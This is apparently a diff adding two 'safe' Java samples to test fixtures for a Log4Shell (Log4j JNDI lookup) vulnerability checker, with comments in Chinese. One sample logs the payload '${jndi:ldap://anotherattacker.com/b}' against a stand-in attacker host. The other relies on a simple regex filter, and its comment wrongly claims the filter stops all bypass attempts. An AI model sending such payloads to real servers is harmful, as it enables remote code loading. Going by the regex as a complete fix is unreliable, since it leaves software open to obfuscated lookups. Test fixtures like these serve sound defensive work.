@@ -380,4 +380,48 @@ EOF
        </build>
    </project>
 EOF
+	"safefile://SafeLog4jExample.java": <<<CODE
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+import javax.servlet.http.HttpServletRequest;
+
+public class SafeLog4jExample {
+    private static final Logger logger = LogManager.getLogger(SafeLog4jExample.class);
+
+    public String handleRequest(HttpServletRequest request) {
+        String userInput = request.getParameter("data");
+        // 对用户输入进行脱敏或过滤，移除潜在的恶意字符串
+        // 使用replaceAll确保所有可能的JNDI查找模式被替换，即使攻击者尝试绕过
+        String safeInput = userInput.replaceAll("\\$\\{jndi:.*\\}", "[FILTERED]"); 
+        logger.info("Received data: " + safeInput); // 记录安全后的输入
+        return "Processed";
+    }
+}
+CODE
+	"safefile://SecureLog4jConfig.java": <<<CODE
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class SecureLog4jConfig {
+    private static final Logger logger = LogManager.getLogger(SecureLog4jConfig.class);
+
+    static {
+        // 设置系统属性以禁用Log4j 2.x中的JNDI Lookups
+        // 这是针对Log4j 2.10.0及以上版本的有效缓解措施
+        System.setProperty("log4j2.formatMsgNoLookups", "true");
+        logger.info("log4j2.formatMsgNoLookups set to true.");
+    }
+
+    public void logSafeMessage(String message) {
+        // 即使传入了可能恶意的字符串，由于配置了禁用JNDI查找，也不会触发漏洞
+        logger.info("Logging securely: " + message);
+    }
+
+    public static void main(String[] args) {
+        SecureLog4jConfig config = new SecureLog4jConfig();
+        // 这个输入不会触发JNDI查找，因为它已被全局禁用
+        config.logSafeMessage("User input: ${jndi:ldap://anotherattacker.com/b}");
+    }
+}
+CODE
 )
